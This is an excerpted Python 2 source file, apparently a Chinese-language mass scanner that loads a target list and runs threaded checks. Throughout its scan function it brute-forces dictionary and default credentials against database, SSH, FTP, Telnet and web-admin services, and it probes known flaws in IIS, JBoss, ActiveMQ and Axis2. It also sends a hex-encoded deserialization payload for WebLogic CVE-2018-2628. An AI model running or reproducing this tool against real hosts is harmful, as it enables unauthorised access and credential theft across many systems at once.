...
def scan(ip,result_name):
    ...
    try:
        printf('[+] IP存活检测 : '+ str(ip))
        log('IP存活检测 : '+ str(ip))
        res_live = os.system('ping -c 1 ' + str(ip))
        if res_live == 0:
            log('当前IP存活 : ' + str(ip))
        else:
            printf('[+] 当前IP无法连接 : ' + str(ip))
            log('当前IP无法连接 : ' + str(ip))
            return ''
    except Exception,e:
        log('[*] 异常状态 : ' + str(e))
    ...
    try:
        printf('[+] Mysql弱口令漏洞 : '+ str(ip))
        log('Mysql弱口令漏洞 : '+ str(ip))
        s = socket.socket()
            ...
            for ppass in dic_pass:
                try:
                    ...
                    if 'Learn' in res:
                        ...
                        res = 'Mysql弱口令漏洞 : ' + str(ip + ':3306|root|' + str(ppass))
    ...
    try:
        printf('[+] Mssql弱口令漏洞 : '+ str(ip))
        log('Mssql弱口令漏洞 : '+ str(ip))
        s = socket.socket()
        ...
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    ...
                    res = 'Mssql弱口令漏洞 : ' + str(ip + ':1433|sa|' + str(ppass))
                    success(res, result_name)
                    log(res)
                    return ''
                except Exception, e:
    ...
    try:
        printf('[+] Postql弱口令漏洞 : '+ str(ip))
        log('Postql弱口令漏洞 : '+ str(ip))
        s = socket.socket()
        ...
        if 'not allowed to' not in cc:
            for ppass in dic_pass:
                try:
                    ...
                    res = 'Postql弱口令漏洞 : ' + str(ip + ':5432|postgres|' + str(ppass))
                    success(res, result_name)
                    log(res)
                    return ''
                except Exception, e:
    ...
    try:
        printf('[+] Oralce弱口令漏洞 : '+ str(ip))
        log('Oralce弱口令漏洞 : '+ str(ip))
        s = socket.socket()
            ...
            for uuser in oracle_user:
                for ppass in oracle_pass_default:
                    try:
                        ...
                        res = 'Oralce弱口令漏洞 : ' + str(ip + ':1521|' +str(uuser)+'|'+ str(ppass))
                        success(res, result_name)
                        log(res)
                        return ''
                    except Exception, e:
            ...
            for uuser in dic_user:
                for ppass in dic_pass:
                    try:
                        ...
                        ssh.connect(ip, 22, uuser, ppass, timeout=timeout, allow_agent=False, look_for_keys=False)
                        ssh.exec_command('whoami', timeout=timeout)
                        res = 'SSH弱口令漏洞 : ' + str(ip + ':22|' + str(uuser) + '|' + str(ppass))
                        success(res, result_name)
                        log(res)
                        return ''
                    except Exception, e:
                        ...
                        if "Unable to connect" in e or "timed out" in e or "Bad authentication type" in e:
                            log('[*] 异常状态 : Unable to connect timed out Bad authentication type')
                    finally:
                        ssh.close()
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))
                ...
                for ppass in dic_pass:
                    try:
                        ...
                        if 'Not implemented' in ftp.dir():
                            ...
                            res = 'FTP弱口令漏洞 : ' + str(ip + ':21|' + str(uuser) + '|' + str(ppass))
                            success(res, result_name)
                            log(res)
                            return ''
    ...
    try:
        printf('[+] Telnet弱口令漏洞 : ' + str(ip))
        log('Telnet弱口令漏洞 : ' + str(ip))
        s = socket.socket()
        s.connect((str(ip), 23))
        s.send('langzi \n')
        cc = s.recv(1024)
            ...
            if re.search(user_match, oss):
                    ...
                    for pass_ in dic_pass:
                        try:
                            ...
                            if re.search(login_match, login_info):
                                res = 'Telnet弱口令漏洞 : ' + str(ip) + ':23|' + str(user) + '|' + str(pass_)
                                success(res, result_name)
                                log(res)
                                return ''
                        except Exception, e:
                ...
                if re.search(user_match, info):
                    ...
                    for pass_ in dic_pass:
                        ...
                        tn.close()
                        if re.search(login_match, login_info):
                            res = 'Telnet弱口令漏洞 : ' + str(ip) + ':23|默认密码:' + str(pass_)
                            success(res, result_name)
                            log(res)
                            return ''
        else:
                ...
                for pass_ in dic_pass:
                    try:
                        ...
                        if "Errno 10061" in str(e) or "timed out" in str(e):
                            log('[*] 异常状态 : Errno 10061 or timed out')
    except Exception, e:
        log('[*] 异常状态 : ' + str(e))
    ...
    try:
        printf('[+] IIS短文件名漏洞 : '+ str(ip))
        log('IIS短文件名漏洞 : '+ str(ip))
        r_=[]
        r3 = 'http://'+str(ip)+':80'
        r4 = 'http://'+str(ip)+':443'
        r_.append(r3)
    ...
    try:
        printf('[+] IIS WebDav任意文件上传漏洞 : '+ str(ip))
        log('IIS WebDav任意文件上传漏洞 : '+ str(ip))
        try:
            s = socket.socket()
            s.connect((ip, 80))
    ...
    try:
        printf('[+] WebLogic WLS  CVE-2018-2628反序列化代码执行漏洞 : '+ str(ip))
        log('WebLogic WLS  CVE-2018-2628反序列化代码执行漏洞 : '+ str(ip))
        PAYLOAD = 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e' \
                  '2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da' \
                  '20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f6361' \
                  '74696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a6563' \
                  '74496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d69' \
                  '2e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e696' \
                  '3617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078 '
        VER_SIG = '\\$Proxy[0-9]+'
        sock = socket.socket()
        server_addr = (ip, 7001)
        t3handshake(sock, server_addr)
        buildT3RequestObject(sock, 7001)
        rs = sendEvilObjData(sock, PAYLOAD)
        p = re.findall(VER_SIG, rs, re.S)
        if len(p) > 0:
            res = 'WebLogic WLS  CVE-2018-2628反序列化代码执行漏洞 : ' + str(ip) +  ':7001'
            success(res, result_name)
            log(res)
            return ''
    except Exception, e:
    ...
    try:
        printf('[+] WebLogic WLS CVE-2017-10271反序列化代码执行漏洞 : '+ str(ip))
        log('WebLogic WLS CVE-2017-10271反序列化代码执行漏洞 : '+ str(ip))
        ...
        for url in check_url:
            target_url = 'http://' + ip + ':' + str(7001) + url.strip()
            ...
            if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
                ...
                if "YES" in check_result:
                    res = 'WebLogic WLS  CVE-2017-10271反序列化代码执行漏洞 : ' + "http://%s:8088/check/%s" % (server_ip, test_str)
                    success(res, result_name)
                    log(res)
                    return ''
            else:
    ...
    try:
        printf('[+] Java RMI 反序列化代码执行漏洞 : '+ str(ip))
        log('Java RMI 反序列化代码执行漏洞 : '+ str(ip))
        address = (ip, 1099)
        sock = socket.socket()
        ...
        sock.close()
        if "8888" in packet1:
            res = 'Java RMI 反序列化代码执行漏洞 : ' + str(ip) + ":1099"
            success(res, result_name)
            log(res)
            return ''
    except Exception, e:
    ...
    try:
        printf('[+] IIS/6.0 WebDav RCE远程代码执行漏洞 : '+ str(ip))
        log('IIS/6.0 WebDav RCE远程代码执行漏洞 : '+ str(ip))
        try:
            s = socket.socket()
            s.connect((ip, 80))
            ...
            if "PROPFIND" in data and "Microsoft-IIS/6.0" in data:
                res = 'IIS6.0 WebDav RCE远程代码执行漏洞 : ' + str(ip)+ ":80"
                success(res, result_name)
                log(res)
                return ''
        except Exception, e:
    ...
    try:
        printf('[+] Tomcat远程部署弱口令漏洞 : '+ str(ip))
        log('Tomcat远程部署弱口令漏洞 : '+ str(ip))
        r_=[]
                        ...
                        for ppass in dic_pass:
                            ...
                            try:
                                ...
                                if 'Router Configuration' in r_br.content:
                                    res = 'Tomcat远程部署弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass)))
                                    success(res, result_name)
                                    log(res)
                                    return ''
                            except Exception, e:
    ...
    try:
        printf('[+] Tomcat后台管理弱口令漏洞 : '+ str(ip))
        log('Tomcat后台管理弱口令漏洞 : '+ str(ip))
        s = socket.socket()
    ...
    try:
        ...
        rr = requests.get(url=str('http://' + str(ip) + '/_config'), timeout=timeout)
    ...
    try:
        printf('[+] ActiveMQ任意文件上传漏洞 : '+ str(ip))
        log('ActiveMQ任意文件上传漏洞 : '+ str(ip))
        s = socket.socket()
        s.connect((ip, 80))
    ...
    try:
        printf('[+] WebServer任意文件读取漏洞 : '+ str(ip))
        log('WebServer任意文件读取漏洞 : '+ str(ip))
        s = socket.socket()
        s.connect((ip, int(80)))
    ...
    try:
        printf('[+] Phpmyadmin弱口令漏洞 : '+ str(ip))
        log('Phpmyadmin弱口令漏洞 : '+ str(ip))
        r_=[]
    ...
    try:
        printf('[+] .NET Padding Oracle信息泄露 : '+ str(ip))
        log('.NET Padding Oracle信息泄露 : '+ str(ip))
        url = 'http://' + ip + ":" + str(80)
    ...
    try:
        printf('[+] Jboss 认证绕过漏洞 : '+ str(ip))
        log('Jboss 认证绕过漏洞 : '+ str(ip))
        socket.setdefaulttimeout(timeout)
    ...
    try:
        printf('[+] Weblogic弱口令漏洞 : '+ str(ip))
        log('Weblogic弱口令漏洞 : '+ str(ip))
        r_=[]
    ...
    try:
        printf('[+] JOnAS弱口令漏洞 : '+ str(ip))
        log('JOnAS弱口令漏洞 : '+ str(ip))
        r_=[]
    ...
    try:
        printf('[+] Glassfish弱口令漏洞 : '+ str(ip))
        log('Glassfish弱口令漏洞 : '+ str(ip))
        r_=[]
        r2 = 'http://' + str(ip) + ':4848'
        r_.append(r2)
        for xxixx in r_:
    ...
    try:
        printf('[+] Wordpress弱口令漏洞 : '+ str(ip))
        log('Wordpress弱口令漏洞 : '+ str(ip))
    ...
    try:
        printf('[+] Axis2任意文件读取漏洞 : '+ str(ip))
        log('Axis2任意文件读取漏洞 : '+ str(ip))
        url = "http://%s:%d" % (ip, int(8080))
    ...
    try:
        printf('[+] Axis2弱口令漏洞 : '+ str(ip))
        log('Axis2弱口令漏洞 : '+ str(ip))
        r_=[]
...
if __name__ == "__main__":
    ...
    ''')
    print unicode('仅做功能测试，存在许多隐藏BUG未发现','utf-8')
    print unicode('发现BUG联系浪子，一般多在于日志与结果中','utf-8')
    print unicode('若无意获取，请立即删除','utf-8')
    time.sleep(3)
    with open('log.txt', 'a+')as aa:
        aa.write(str(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())) + ' - ' + '弱口令漏洞扫描检测开始' + '\n')
    ...
    try:
        ...
        urllist = list(set([x.replace('\n', '').replace('"','').replace("'",'') for x in open(urltxt, 'r').readlines()]))
        smxc = int(input(unicode('设置线程池数量(8-1024):', 'utf-8').encode('gbk')))
        time.sleep(random.randint(1, 4))
        print unicode('线程池创建成功...', 'utf-8')
        time.sleep(random.randint(1, 5))
        print unicode('规则创建成功，开始计算总任务量...', 'utf-8')
        time.sleep(random.randint(1, 5))
        count = len(urllist)*len(dic_pass)*len(dic_user)*30
        count_time = count / 3600 / smxc
